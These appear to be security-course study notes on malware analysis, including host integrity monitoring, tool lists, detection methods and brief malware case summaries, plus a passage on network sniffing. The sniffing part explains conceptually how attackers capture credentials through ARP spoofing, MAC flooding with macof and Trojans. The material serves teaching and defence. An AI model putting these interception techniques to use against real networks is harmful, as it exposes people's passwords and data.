					- Host integrity monitoring is the process of studying changes that occur across a system or machine after a series of actions or incidents. It involves taking snapshots of the system before and after the event using the same tools, then analyzing the changes to evaluate their impact on the system and its properties.
					- In malware analysis, host integrity monitoring helps to understand the runtime behavior of a malware file, including its activities, propagation techniques, URLs accessed, downloads initiated, and other actions it performs. This process detects changes made to the system's entities, such as files, processes, or configurations, during the analysis.
					- Host Integrity Monitoring includes the following:
						- Port Monitoring:
							- Malware programs compromise the system and open input/output ports to establish connections with remote systems, networks, or servers to carry out various malicious activities. These open ports can also serve as backdoors for other harmful malware or programs. Open ports act as communication channels, allowing malware to connect back to its handlers by opening unused ports on the victim's machine. Scanning for suspicious ports can help identify such malware.
							- During dynamic analysis, malware activity can be monitored for attempts to access particular ports using port monitoring tools like TCPView or command-line utilities such as netstat. These tools provide details such as the protocol used, local and remote addresses, and the connection's state. Additional information, such as process name, process ID, and remote connection protocol, may also be available. Port monitoring tools should be used to scan for suspicious ports and check for connections to unknown or suspicious IP addresses.
							- Port Monitoring Tools:
								- Netstat : It displays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, IPv4 statistics (for IP, ICMP, TCP, and UDP protocols), and IPv6 statistics (for IPv6, ICMPv6, TCP over IPv6, and UDP over IPv6 protocols). When used without parameters, netstat displays only active TCP connections.
								- TCPView : TCPView is a Windows program that provides detailed listings of all TCP and UDP endpoints on the system, including local and remote addresses, as well as the state of TCP connections. It offers a subset of the netstat program that comes with Windows. The TCPView download also includes Tcpvcon, a command-line version with the same functionality. When TCPView is run, it enumerates all active TCP and UDP endpoints, resolving IP addresses to their domain name equivalents.
								- CurrPorts (www.nirsoft.net)
								- TCP Port/Telnet Monitoring (www.dotcom-monitor.com)
								- PRTG's Network Monitor (www.paessler.com)
								- SolarWinds Open Port Scanner (www.solarwinds.com)
						- Process Monitoring:
							- Malware can enter a system through images, music files, videos, and other files downloaded from the Internet. It often disguises itself as legitimate Windows services and hides its processes to avoid detection. Some malware uses Portable Executable (PE) files to inject itself into various processes (such as explorer.exe or web browsers). While these malicious processes are visible, they appear legitimate, allowing them to bypass desktop firewalls. Attackers may use rootkit techniques to conceal malware, making it harder for antivirus software to detect.
							- Process monitoring is crucial for understanding the processes initiated by malware and the ones it takes over after execution. It is also important to monitor child processes, associated handles, loaded libraries, functions, and the execution flow of boot-time processes to fully define the nature of a file or program. By gathering information on processes running before and after malware execution, and comparing them, analysts can more quickly identify all the processes that malware starts. Using process-monitoring tools such as Process Monitor helps in detecting suspicious processes and speeding up the analysis.
							- Process Monitoring Tools:
								- Process Monitor : Process Monitor is a Windows monitoring tool that displays real-time file system, registry, and process/thread activity. It combines the functionality of two legacy Sysinternals utilities, Filemon and Regmon, while adding several enhancements, including advanced and non-destructive filtering, comprehensive event properties (such as session IDs and usernames), reliable process information, full thread stacks with integrated symbol support for each operation, and the ability to log events simultaneously to a file. These unique features make Process Monitor an essential tool in system troubleshooting and malware analysis toolkits.
								- Process Explorer (learn.microsoft.com)
								- OpManager (www.manageengine.com)
								- Monit (mmonit.com)
								- ESET SysInspector (www.eset.com)
								- System Explorer (systemexplorer.net)
						- Windows Registry Monitoring:
							- The Windows registry stores operating system and program configuration details, including settings and options. If the malware is a program, its functionality may also be stored in the registry. Malware often leverages the registry to persistently perform harmful activities by creating entries that ensure the malicious program runs automatically whenever the computer or device boots.
							- Windows automatically executes instructions in specific sections of the registry, including:
								- Run
								- RunServices
								- RunOnce
								- RunServicesOnce
								- HKEY_CLASSES_ROOT\exefile\shell\open\command ("%1" %*)
							- Malware often inserts instructions in these sections to carry out malicious activities. A solid understanding of the Windows registry, its structure, and its inner workings is essential for analyzing potential malware. Scanning for suspicious registry entries can aid in detecting malware infections. Tools like RegScanner can be used to examine registry values for any entries that appear suspicious or indicative of a malware infection.
							- To detect and analyze changes made by malware to the system registry, use registry monitoring tools such as jv16 PowerTools.
							- Registry Monitoring Tools:
								- jv16 PowerTools : jv16 PowerTools is a PC system utility software designed to optimize system by removing unnecessary files and data, cleaning the Windows registry, automatically fixing system errors, and improving overall performance. It includes features for scanning and monitoring the registry, which can help detect malicious registry entries created by malware. The "Clean and Speed Up My Computer" feature in the Registry Cleaner is specifically designed to fix registry errors, resolve system issues, and remove registry leftovers, as well as unnecessary files like old log files and temporary files. It serves as a powerful registry cleaner for identifying registry errors and eliminating unneeded registry junk.
								- Reg Organizer (www.chemtable.com)
								- Registry Viewer (www.exterro.com)
								- RegScanner (www.nirsoft.net)
								- Registry Monitoring Tool (www.solarwinds.com)
								- regshot (sourceforge.net)
						- Windows Services Monitoring:
							- Attackers design malware and other malicious code to install and run on a computer as services. Since most services operate in the background to support processes and applications, malicious services can remain hidden while performing harmful activities without user intervention or input.
							- Malware often spawns Windows services to enable attackers to remotely control the victim’s machine and execute malicious instructions. To avoid detection, malware may disguise its processes by renaming them to resemble legitimate Windows services. Additionally, malware can use rootkit techniques to manipulate registry keys, such as HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services, to hide its processes and services.
							- These malicious services often run under privileged accounts, such as the SYSTEM account, granting them greater access than standard user accounts and making them more dangerous than typical malware or executable files. Attackers further conceal their actions by naming malicious services similarly to legitimate Windows services.
							- To identify and trace malicious services initiated by malware during dynamic analysis, use Windows service monitoring tools like Windows Service Manager (SrvMan). These tools detect service changes and scan for suspicious Windows services.
							- Windows Service Monitoring Tools:
								- Windows Service Manager (SrvMan):
									- SrvMan offers both GUI and command-line modes. It can also run arbitrary Win32 applications as services, automatically closing the main application window when the service is stopped.
									- SrvMan's command-line interface can be used to perform the following tasks:
										- Create services
										- Delete services
										- Start, stop, or restart services
										- Install and start a legacy driver with a single command
								- Netwrix Service Monitor (www.netwrix.com)
								- AnVir Task Manager (www.anvir.com)
								- Service+ (www.activeplus.com)
								- Advanced Windows Service Manager (securityxploded.com)
								- Process Hacker (processhacker.sourceforge.io)
						- Startup Programs Monitoring:
							- Malware can modify system settings and add itself to the startup menu, enabling malicious activities each time the system starts. Therefore, it is essential to scan for suspicious startup programs manually or use startup monitoring tools, such as Autoruns for Windows, to detect malware effectively.
							- Manually Detect Hidden Malware:
								- Check Startup Program Entries in the Registry:
									- Startup items, including programs, shortcuts, folders, and drivers, are configured to run automatically when users log into a Windows operating system (e.g., Windows 11). These items can be added by installed programs or drivers, or manually by the user. Programs configured to run at Windows 11 startup can be found in specific registry entries, such as the Windows startup settings, Explorer startup settings, and Internet Explorer (IE) startup settings.
									- Windows Startup Setting
									- Explorer Startup Setting
									- Microsoft Edge Startup Settings
								- Check Automatically Loaded Device Drivers:
									- Navigate to C:\Windows\System32\drivers to review the device drivers automatically loaded by the system.
								- Check boot.ini or BCD (Boot Manager) Entries:
									- Open Command Prompt with administrative privileges
									- Type bcdedit and press Enter
									- This will display all the boot manager entries
								- Check Windows Services That Start Automatically:
									- Open the Run dialog by pressing Win + R
									- Type services.msc and press Enter
									- In the Services window, sort the services by Startup Type to view the list of services configured to start automatically when the system boots.
								- Check the Startup Folder:
									- Startup folders contain applications or shortcuts to applications that are configured to run automatically when the system boots. To check the startup applications in Windows 11, examine the following locations:
										- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
										- C:\Users\(User-Name)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
									- Another method to access the startup folders:
										- Press Windows + R to open the Run dialog box.
										- Type shell:startup and click OK to navigate directly to the startup folder.
							- Startup Program Monitoring Tool:
								- Autoruns for Windows:
									- This utility can identify the location of any startup monitor, display the programs configured to run during system bootup or login, and show the entries in the order that Windows processes them. Once a program is included in the startup folder, Run, RunOnce, or other registry keys, users can configure Autoruns to display additional locations, such as Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, and auto-start services.
									- The Hide Signed Microsoft Entries option in Autoruns helps users focus on third-party auto-start items added to their system. It also provides support for reviewing auto-start entries configured for other user accounts on the system.
								- WinPatrol (www.bleepingcomputer.com)
								- Autorun Organizer (www.chemtable.com)
								- Quick Startup (www.glarysoft.com)
								- StartEd Pro (www.outertech.com)
								- Chameleon Startup Manager (www.chameleon-managers.com)
						- Event Logs Monitoring/Analysis:
							- Log analysis involves examining computer-generated records or activities to identify malicious or suspicious events. This process provides detailed information about activities or events, which can reveal possible attacks, such as Trojans or worms in the system. It serves as a vital source of information for identifying security gaps and detecting threats.
							- Log analysis can uncover zero-day backdoor Trojans or other potential attacks, such as failed authentication or login attempts, by analyzing logs from various components. Logs from security-critical components, including firewall systems, IDS/IPS, web servers, and authentication servers, are particularly valuable. They often contain details such as file types, ports, timestamps, and registry entries.
							- In Windows, system logs, application logs, access logs, audit logs, and security logs can be analyzed using the Event Viewer under the Windows Logs section. To streamline the process, use log analysis tools like Splunk to identify suspicious logs or events with malicious intent.
							- Locating System Logs:
								- System Logs: Start -> Event Viewer -> Windows Logs
								- System Security Logs: Start -> Event Viewer -> Windows Logs -> Security
								- Applications and Services Logs: Start -> Event Viewer -> Applications and Services Logs
							- Log Monitoring/Analysis Tools:
								- Splunk : It is an SIEM tool that automatically collects event logs from all systems within a network. To enable monitoring, Splunk forwarders must be installed on all systems in the network. These forwarders transfer real-time event logs from the network systems to the central Splunk dashboard.
								- ManageEngine Event Log Analyzer (www.manageengine.com)
								- Solarwinds Loggly (www.loggly.com)
								- Netwrix Event Log Manager (www.netwrix.com)
								- New Relic (newrelic.com)
						- Installation Monitoring:
							- When a system or user installs or uninstalls a software application, traces of the application data may remain on the system. To identify these traces, it is essential to know which folders were modified or created during the installation process, as well as files and folders that were not removed by the uninstallation process.
							- Installation monitoring is useful for detecting hidden or background installations carried out by malware. Tools such as SysAnalyzer can be used to monitor the installation of malicious executables and help identify suspicious activity.
							- Installation Monitoring Tools:
								- Mirekusoft Install Monitor : Mirekusoft Install Monitor automatically tracks what is placed on a system and allows for complete uninstallation. It monitors resources such as files and registry entries created during program installation and provides detailed information about installed software. Additionally, it determines the disk, CPU, and memory consumption of programs and tracks how frequently different programs are used. A program tree is included as a useful feature to show which programs were installed together.
								- Advanced Uninstaller PRO (www.advanceduninstaller.com)
								- REVO UNINSTALLER PRO (www.revouninstaller.com)
								- Comodo Programs Manager (www.comodo.com)
						- Files and Folders Monitoring:
							- Malware programs often modify system files and folders after infecting a computer. They may alter these files and folders to store information, making it important to identify and analyze them to uncover any relevant data. These files and folders may also contain hidden program code or malicious strings, which the malware could execute on a specified schedule.
							- To detect changes in system files and folders, use file and folder integrity checkers such as PA File Sight, Tripwire, and Netwrix Auditor. These tools can also help identify suspicious files and folders, detect Trojans, and monitor system file modifications.
							- File and Folder Integrity Checking Tools:
								- PA File Sight : PA File Sight is a protection and auditing tool designed to detect and prevent malicious activities, including ransomware attacks originating from the network. It blocks compromised computers from accessing files on other protected servers and detects users copying files, with an option to block such access. The tool provides real-time alerts, enabling immediate investigation by appropriate staff, and monitors file activities such as deleting, moving, or reading files.
								- Tripwire File Integrity Monitoring (www.tripwire.com)
								- Netwrix Auditor (www.netwrix.com)
								- Verisys Integrity Suite (www.ionxsolutions.com)
								- CSP File Integrity Checker (www.cspsecurity.com)
								- NNT Change Tracker (www.newnettechnologies.com)
						- Device Drivers Monitoring:
							- Malware can be installed on a system alongside device drivers downloaded from untrusted sources, with attackers using these drivers as a shield to evade detection. To identify suspicious device drivers, driver monitoring tools such as DriverView and Driver Detective can be used to scan and verify their authenticity and ensure they were downloaded from the publisher’s original site (legitimacy).
							- Windows System Drivers Path: Go to Run -> Type msinfo32 and Enter -> Software Environment -> System Drivers
							- Device Driver Monitoring Tools:
								- DriverView : The DriverView utility displays a list of all device drivers currently loaded on the system, along with details such as the driver's load address, description, version, product name, and manufacturer.
								- Driver Booster (www.iobit.com)
								- Driver Reviver (www.reviversoft.com)
								- Driver Easy (www.drivereasy.com)
								- Driver Fusion (treexy.com)
								- Driver Genius (www.driver-soft.com)
						- Network Traffic Monitoring/Analysis:
							- Network analysis is the process of capturing and carefully examining network traffic to identify malware activity. It helps determine the type of traffic, network packets, or data transmitted across the network. Malware often relies on the network for activities such as propagation, downloading malicious content, transmitting sensitive information, and enabling remote control by attackers. Some malware connects back to its handlers and sends confidential information.
							- To monitor network traffic directed to malicious remote addresses, use network scanners and packet sniffers. Network monitoring tools such as SolarWinds NetFlow Traffic Analyzer, Capsa Network Analyzer, and Wireshark can be used to capture live network traffic to and from the victim’s system during the execution of suspicious programs. This helps in understanding the malware’s network artifacts, signatures, functions, and other characteristics.
							- Network Activity Monitoring Tools:
								- SolarWinds NetFlow Traffic Analyzer : NetFlow Traffic Analyzer collects traffic data, converts it into a usable format, and presents it to the user through a web-based interface for easy monitoring of network traffic. It offers features such as network traffic analysis, bandwidth monitoring, application traffic alerting, performance analysis, CBQoS policy optimization, and the identification of malicious or malformed traffic flows to enhance network performance and security.
								- Caspa Network Analyzer (www.colasoft.com)
								- Wireshark (www.wireshark.org)
								- PRTG Network Monitor (kb.paessler.com)
								- GFI LanGuard (www.gfi.com)
								- insightIDR (www.rapid7.com)
						- DNS Monitoring/Resolution:
							- DNSChanger is a malicious software capable of altering the system's DNS server settings, giving attackers control over the DNS server used on the victim’s system.
							- Use DNS monitoring tools such as DNSQuerySniffer and DNSstuff to verify the DNS servers the malware attempts to connect to and identify the type of connection. Attackers can then control the websites the user attempts to access, redirect them to fraudulent sites, or interfere with their online browsing activities.
							- DNS Monitoring/Resolution Tools:
								- DNSQuerySniffer : DNSQuerySniffer is a network sniffer utility that displays DNS queries sent from system. For each DNS query, it shows the following information: host name, port number, query ID, request type (A, AAAA, NS, MX, etc.), request time, response time, duration, response code, number of records, and the content of the returned DNS records.
								- DNSstuff (www.dnsstuff.com)
								- UltraDNS (vercara.com)
								- Sonar Lite Web App (constellix.com)
								- DNSCheck.co (www.dnscheck.co)
								- Dotcom-Monitor (www.dotcom-monitor.com)
						- API Calls Monitoring:
							- Application Programming Interfaces (APIs) are components of the Windows OS that allow external applications to access OS information, such as file systems, threads, errors, the registry, kernel, buttons, mouse pointers, network services, web, and the Internet. Malware programs exploit these APIs to access OS information and damage the system.
							- To understand how malware interacts with the OS and the activities it performs, it's important to gather and analyze the APIs related to the malware. Tools such as API Monitor can be used to monitor API calls made by applications.
							- API Call Monitoring Tools:
								- API Monitor : API Monitor is a software tool that allows to monitor and display Win32 API calls made by applications. It can trace any exported API and provides a wide range of information, including the function name, call sequence, input and output parameters, function return values, and more. It is a valuable tool for developers to understand how Win32 applications operate and to learn their behaviors.
								- API Call Monitoring (apicontext.com)
								- Runscope (www.runscope.com)
								- AlertSite (smartbear.com)
						- System Calls Monitoring:
							- Syscalls (system calls) serve as an interface between an application and the kernel, providing a way for processes activated by the OS to request specific resources. System calls are generated by an application or program when it requires access to system resources. These calls are typically triggered during context switching between user mode and kernel mode.
							- Monitoring system calls is essential for detecting malware and understanding its behavior. It can also help identify the type of damage caused by malware to the system. Tools such as strace can be used to view or trace system calls in a Linux environment.
							- System Calls Monitoring Tools:
								- strace : The strace tool intercepts and records the system calls made by a process, as well as the signals received by the process. It prints the name of each system call, its arguments, and its return value to standard error or to a file specified using the -o option.
									- Attaching the strace tool to the active process: strace -p <ProcessID>
									- View only system calls accessing a specific or given path: strace -P <given_path> ls /var/empty
									- Count time, calls, and errors for each system call: strace -c ls > /dev/null
									- Extract system calls and save the output in text file: strace -o out.txt ./<sample file>
						- Scheduled Tasks Monitoring:
							- Malware can use time-based or action-based triggers as scheduled tasks. Attackers design malware to remain inactive until a specific date or event triggers its execution using Windows Task Scheduler. To detect such malware, it’s essential to check for scheduled tasks, such as logic bombs, which can execute under different triggers. Command-line tools like schtasks and Windows Task Scheduler can display a list of all system scheduled tasks. Additionally, ADAudit Plus can help detect suspicious scheduled tasks.
							- Windows Scheduled Task Monitoring Tools:
								- ADAudit Plus (www.manageengine.com)
								- CronitorCLI (cronitor.io)
								- SolarWinds Windows Scheduled Task Monitor (www.solarwinds.com)
						- Browser Activity Monitoring:
							- Malware can exploit browsers to connect with C&C servers, malicious websites, and other DNS servers to download harmful files. It is essential to inspect suspicious browsing activities to identify malicious traffic and system vulnerabilities. Since browsers typically use ports 80, 443, or 8080 to connect to C&C servers, checking for any unusual activity occurring through these ports is crucial.
							- Additionally, web caches can be examined, web access at firewalls monitored, and web traffic filtered by URL and malicious strings found in web logs. Network monitoring tools such as Wireshark and Colasoft Portable Network Analyzer can be used to analyze browsing activities.
							- Monitoring Tools:
								- Wireshark : Wireshark is a widely used network protocol analyzer capable of capturing real-time browser traffic passing through a network. It sorts the captured traffic using filters, enabling analysts to identify malicious communication with C&C servers and malicious IP addresses.
								- Colasoft Portable Network Analyzer (www.colasoft.com)
								- OmniPeek (www.liveaction.com)
								- Observer Analyzer (www.viavisolutions.com)
								- PRTG Network Monitor (www.paessler.com)
								- NetFlow Analyzer (www.manageengine.com)
	- Supporting Tools for Malware Analysis:
		- Virtual Machines Tools:
			- VirtualBox
			- VMware Workstation
			- Microsoft Hyper-V
			- Parallels® Desktop
			- Boot Camp
		- Screen Capture and Recording Tools:
			- Snagit
			- TechSmith Capture
			- Camtasia
			- Ezvid
		- Network and Internet Simulation Tools:
			- NetSim Professional
			- ns-3
			- Riverbed Modeler
			- GNS3
		- OS Backup and Imaging Tools:
			- Genie Backup Manager Pro
			- Macrium Reflect Server
			- R-Drive Image
			- O&O DiskImage 18 Server
	- Virus Detection Methods:
		- Scanning:
			- A virus scanner is essential software for detecting and preventing viruses. Without a scanner, the system is highly susceptible to virus attacks. Antivirus tools should run continuously and be updated regularly to keep the scan engine and virus signature database current.
			- Virus writers often modify existing viruses to create new variants, aiming to evade detection. To counter this, modern scanners use advanced techniques like code analysis, examining various parts of executable files to enhance virus recognition.
		- Integrity checking:
			- Integrity-checking products function by reading and recording integrated data to develop a signature or baseline for files and system sectors. However, a limitation of basic integrity checkers is their inability to distinguish between file corruption caused by bugs and that caused by viruses. To address this, some integrity checkers combine antivirus techniques with integrity checking, creating a hybrid tool.
		- Interception:
			- The primary objective of an interceptor is to deflect logic bombs and Trojans. It achieves this by monitoring and controlling requests to the operating system for network access or actions that could threaten programs. When such a request is detected, the interceptor prompts the user to decide whether to allow it.
			- However, there is no reliable method to intercept direct branches to low-level code or direct input/output instructions executed by a virus. Additionally, some viruses are capable of disabling the monitoring program itself, further complicating detection and prevention.
		- Code Emulation:
			- Code emulation allows antivirus software to use a virtual machine to simulate CPU and memory activities. In this process, the virus code is executed within the virtual machine rather than the actual processor. This approach is particularly effective against encrypted and polymorphic viruses. Over time, the decrypted virus body is exposed and can be detected by the scanner. Code emulation can also identify metamorphic viruses, whether they use single or multiple encryption layers.
			- However, a drawback of code emulation is its inefficiency when dealing with viruses that have very long decryption loops, as the process becomes significantly slower.
		- Heuristic Analysis:
			- This method aids in detecting new or unknown viruses, often variants of an existing virus family. Heuristic analysis can be either static or dynamic. In static analysis, the antivirus tool examines the file format and code structure to assess whether the code is malicious. In dynamic analysis, the antivirus tool emulates the execution of suspicious code to determine its behavior.
			- A major drawback of heuristic analysis is its susceptibility to false positives, where benign code is incorrectly identified as malicious. This can lead users to mistrust positive test results, potentially dismissing a real threat as a false alarm.
	- Malware Code Emulation:
		- Malware code emulation is a technique used to perform static or dynamic malware analysis on suspected malware samples. It creates an isolated virtual environment to execute a malware sample by mimicking its hardware and software requirements without interrupting its actual functionality. This method allows for thorough examination without compromising the host system.
		- Unlike sandboxing, which uses an isolated environment with a real operating system to run malware samples for behavior analysis, code emulation temporarily simulates components such as processors, memory, hard disks, network devices, operating systems, antivirus software, and system registries. This approach enables greater control over the malware's execution and provides more flexibility in the analysis.
		- Malware emulators offer the ability to set breakpoints to pause execution, allowing the malware to bypass anti-malware techniques. They can emulate and run malware on multiple operating systems, requiring fewer resources than sandboxes. Additionally, emulators can operate on any host system, making them a versatile tool for malware analysis.
		- Malware Code Emulator Tools:
			- SCEMU : SCEMU is an x86 32/64-bit emulator designed to securely emulate malware. It includes all necessary dependencies and contains no unsafe blocks. SCEMU can execute up to 2,000,000 instructions per second, utilizing the iced-x86 Rust Disassembler Library. Additionally, it supports known Metasploit payloads, such as shellcodes and encoders. SCEMU visualizes the output in a colorized format and allows users to pause execution at any point to explore the system's state.
			- Unicorn
			- QEMU
			- Windows_Malware_Emulator
			- Speakeasy
			- Kaspersky Lab Emulator
	- Malware Code Instrumentation:
		- Malware code instrumentation is a technique used in cybersecurity to analyze and understand the behavior of malicious software by injecting additional code or instructions at specific points within the binary code. These instructions enable the capture of critical events or actions performed by malware during execution, such as logging function calls, tracking memory allocations, monitoring network communications, and recording file system interactions in real time.
		- Analysts can then examine the collected data to gain insights into the malware's behavior, attack techniques, capabilities, and intent, which can help in developing effective countermeasures to mitigate the threats posed by the malware.
		- However, malware code instrumentation is a challenging process due to the complexity of analyzing and modifying binary code, and attackers may employ anti-analysis techniques to evade detection and thwart instrumentation efforts. Tools like Frida and HawkEye can be used to perform code instrumentation.
		- Code Instrumentation Tools:
			- HawkEye : HawkEye is a dynamic malware instrumentation tool based on the frida.re framework. It allows to hook common functions to log malware activities and output the results in a well-organized webpage report. HawkEye can run in two modes: spawning a malware sample in a new process by providing its path, or hooking a running process using its PID.
			- Frida
	- Trojan Analysis: Coyote:
		- Attackers have developed “Coyote,” a sophisticated banking Trojan with advanced evasion techniques to bypass security and steal financial data from internet banking users. Unlike traditional malware using Delphi or MSI installers, Coyote employs the Squirrel installer for Windows applications and uses Nim as its cross-platform loader.
	- Virus Analysis: GhostLocker 2.0:
		- GhostLocker 2.0, developed by the GhostSec hacktivist group, is an updated ransomware written in Golang with advanced tools for tracking payouts and campaigns. It spreads via compromised software supply chains and vulnerable RDP configurations, enabling lateral movement and data encryption. GhostLocker 2.0 uses double extortion, demanding ransoms while threatening to leak sensitive data. In November 2023, GhostSec announced this update and hinted at developing GhostLocker V3.
	- Fileless Malware Analysis: PyLoose:
		- PyLoose is a Python-based fileless malware designed to target cloud workloads for long-term cryptomining. It injects malicious Python code and uses memfd to load an XMRig miner directly into system memory, making it undetectable by antivirus solutions. The malware was first identified in mid-2023 using the Wiz Runtime Sensor.
	- AI-based Malware Analysis: FakeGPT:
		- In February 2023, a sophisticated malware campaign called FakeGPT was discovered, exploiting ChatGPT’s popularity to distribute a malicious Chrome extension named "Quick Access to Chat GPT." The extension provided access to a fake ChatGPT platform designed to compromise Facebook accounts. It installed a covert Facebook app backdoor, granting attackers super-admin rights to high-profile business accounts. This allowed them to build a botnet and a malicious advertising mechanism, using victims’ resources to spread paid ads in a self-replicating, wormlike manner.
	- Anti-Malware Software:
		- Anti-Trojan Software:
			- Avast One (www.avast.com)
			- Bitdefender Total Security (www.bitdefender.com)
			- Panda Dome (www.pandasecurity.com)
			- NortonTM 360 (us.norton.com)
			- G DATA Total Security (www.gdatasoftware.com)
			- TotalAV (www.totalav.com)
			- Surfshark Antivirus (surfshark.com)
			- NordVPN Threat Protection (nordvpn.com)
			- Sophos (www.sophos.com)
			- Trend Micro Maximum Security (www.trendmicro.com)
			- Malwarebytes (www.malwarebytes.com) 
			- Avira (www.avira.com)
			- Emsisoft Anti-Malware Home (www.emsisoft.com) 
			- HitmanPro (www.hitmanpro.com)
		- Antivirus Software:
			- McAfee® Total Protection (www.mcafee.com)
			- Kaspersky Anti-Virus (www.kaspersky.com)
			- Norton AntiVirus Plus (us.norton.com)
			- Bitdefender Antivirus Plus (www.bitdefender.com)
			- Avast Premier Antivirus (www.avast.com)
			- Intego (www.intego.com)
			- TotalAV Antivirus Pro (www.totalav.com)
			- Webroot SecureAnywhere Antivirus (www.webroot.com)
			- ESET Internet Security (www.eset.com)
			- Avira Antivirus Pro (www.avira.com)
			- Panda Total protection (www.pandasecurity.com)
		- Fileless Malware Detection Tools:
			- Cynet Next-Gen Antivirus (NGAV) (www.cynet.com)
			- Apex One (www.trendmicro.com)
			- Cortex XDR (www.paloaltonetworks.com)
			- ManageEngine Next-Gen Antivirus (NGAV) (www.manageengine.com)
			- Kaspersky Total Security (www.kaspersky.com)
			- Xcitium Advanced (EPP+EDR) (www.xcitium.com)
		- Fileless Malware Protection Tools:
			- Microsoft Defender for Endpoint (www.microsoft.com)
			- FortiEDR (www.fortinet.com)
			- Kaspersky End Point Security for Business (www.kaspersky.com)
			- Sophos Intercept X (www.sophos.com)
			- CylanceENDPOINTTM (www.blackberry.com)
			- IBM Security QRadar EDR (www.ibm.com)
		- AI-Powered Malware Detection and Analysis Tools:
			- Malware.AI (www.malware.ai)
			- Sophos Intercept X (www.sophos.com)
			- Elastic Security (www.elastic.co)
			- Bitdefender GravityZone (www.bitdefender.com)
			- Vipre Endpoint Security (vipre.com)
			- Webroot SecureAnywhere (www.webroot.com)
		- Endpoint Detection and Response (EDR/XDR) Tools:
			- CrowdStrike Falcon® Insight XDR (www.crowdstrike.com)
			- Microsoft Defender for Endpoint (www.microsoft.com)
			- Tanium Endpoint Management (www.tanium.com)
			- Cisco XDR (www.cisco.com)
			- Trellix Endpoint Security (ENS) (www.trellix.com)
			- VMware Carbon Black (www.vmware.com)


--------------------------------------------------

# Sniffing

- Network/Packet Sniffing
	- Packet sniffing is the process of monitoring and capturing data packets that pass through a network, typically using specialized software or hardware tools. Packet sniffers can intercept packets containing sensitive information such as passwords, account details, syslog traffic, router configurations, DNS queries, email traffic, web traffic, chat sessions, and FTP credentials. This enables an attacker to read cleartext passwords, view actual emails, and access sensitive data such as credit card numbers and financial transactions.
	- Packet sniffing can also capture traffic from protocols like SMTP, POP, IMAP, HTTP Basic authentication, Telnet, SQL databases, SMB, NFS, and FTP. By analyzing the captured data, an attacker can gather valuable information to compromise the network. Additionally, attackers can enhance the effectiveness of their attacks by combining packet sniffing with active transmission techniques.
	- Sniffing is easier in hub-based networks, where traffic is broadcast to all connected hosts. In modern switch-based networks, a switch forwards data only to the port associated with the destination MAC address, unlike a hub, which sends data to all ports. To capture traffic on a switch, attackers must manipulate its functionality. A packet sniffer in promiscuous mode can bypass Ethernet NIC filters to capture and analyze all traffic on a subnet, although it cannot access packets from other networks.
	- Despite widespread use of switches, sniffing remains effective. Open switch ports in many networks allow devices to connect and access traffic. Attackers can also install remote sniffing tools on high-traffic components like servers and routers, enabling them to monitor and capture network traffic from a single point.
	- Working of Sniffer:
		- The most common way to network computers is through an Ethernet connection. A computer connected to a local area network (LAN) has two types of addresses: a MAC address and an Internet Protocol (IP) address. The MAC address uniquely identifies each device in the network and is stored on the NIC (Network Interface Card). Ethernet uses the MAC address to transfer data by incorporating it into data frames. At the data link layer of the OSI model, an Ethernet header uses the MAC address of the destination machine rather than the IP address.
		- The network layer handles mapping IP addresses to MAC addresses, as required by the data link protocol. It first checks the Address Resolution Protocol (ARP) cache, a table that stores mappings of IP addresses to MAC addresses. If no entry exists for the destination IP address, an ARP broadcast request is sent to all devices on the local subnet. The device with the matching IP address responds with its MAC address, which is then added to the source machine’s ARP cache. Subsequent communications between the source and destination machines use the cached MAC address.
		- There are two basic types of Ethernet environments, and sniffers operate differently in each:
			- Shared Ethernet:
				- In a shared Ethernet environment, all hosts are connected to a single bus and compete for bandwidth. When one machine (e.g., machine 1) communicates with another (e.g., machine 2), it sends a packet onto the network with the destination MAC address of machine 2 and its own source MAC address. Other machines (e.g., machines 3 and 4) compare the frame's destination MAC address to their own and discard unmatched frames. However, a machine running a sniffer bypasses this rule and accepts all frames. Sniffing in a shared Ethernet environment is passive and therefore difficult to detect.
			- Switched Ethernet:
				- In a switched Ethernet environment, hosts are connected to a switch instead of a hub. The switch maintains a table that maps each computer's MAC address to the physical port it is connected to and forwards packets only to the intended recipient. Unlike a hub, a switch does not broadcast packets to all devices, resulting in better bandwidth utilization and enhanced security. Consequently, placing a NIC into promiscuous mode to capture packets is ineffective. This has led many to believe that switched networks are secure and immune to sniffing. However, this is not entirely true.
		- Network Sniffing Methods:
			- ARP Spoofing:
				- The Address Resolution Protocol (ARP) is stateless, meaning a machine can send an ARP reply without receiving a request, and other devices may accept such unsolicited replies. To sniff traffic from another system, a machine can perform ARP spoofing by impersonating the network gateway. This causes the target machine's ARP cache to store an incorrect entry for the gateway's MAC address. As a result, all traffic intended for the gateway is redirected to the machine that spoofed the gateway's MAC address.
			- MAC Flooding:
				- Switches maintain a translation table that maps MAC addresses to the physical ports on the switch, allowing them to intelligently route packets between hosts. However, switches have limited memory. MAC flooding exploits this limitation by overwhelming the switch with fake MAC addresses until it can no longer process them. When the switch's memory is exhausted, it enters fail-open mode, behaving like a hub by broadcasting packets to all ports. This makes it easier to perform sniffing. The tool macof, which is part of the dsniff suite, is commonly used by attackers to carry out MAC flooding.
			- When a switch operates as a hub, it broadcasts all packets to all network devices. Normally, NICs only accept packets addressed to them, as promiscuous mode is disabled by default. A sniffer enables promiscuous mode, allowing the NIC to capture all traffic on the network segment. Attackers exploit this by configuring their NICs in promiscuous mode to intercept and analyze all transmitted packets.
	- Types of Sniffing:
		- Passive Sniffing:
			- Passive sniffing does not involve sending packets; it simply captures and monitors packets flowing through the network. A packet sniffer alone is generally not preferred for attacks because it functions only within a common collision domain. A common collision domain refers to a network segment that is not switched or bridged, typically found in hub-based networks. In such environments, all hosts can see all network traffic, making it easy to capture data using passive sniffing.
			- Most modern networks use switches instead of hubs, which reduces the risk of passive sniffing. Passive sniffing offers significant stealth advantages compared to active sniffing, as it does not generate detectable traffic.
			- Passive Sniffing Methods (to gain control over target network):
				- Compromising Physical Security : An attacker who breaches the physical security of an organization can connect a laptop to the network to capture sensitive information.
				- Using a Trojan Horse : Many Trojans have built-in sniffing capabilities. An attacker can install a Trojan on a victim’s machine to compromise it and then deploy a packet sniffer to intercept network traffic.
		- Active Sniffing:
			- Active sniffing involves injecting traffic into a switched LAN to capture data. Unlike hub-based networks, switches do not broadcast packets to all systems, making passive sniffing ineffective. Active sniffing is harder to detect but can be achieved by injecting ARP traffic to intercept network data.
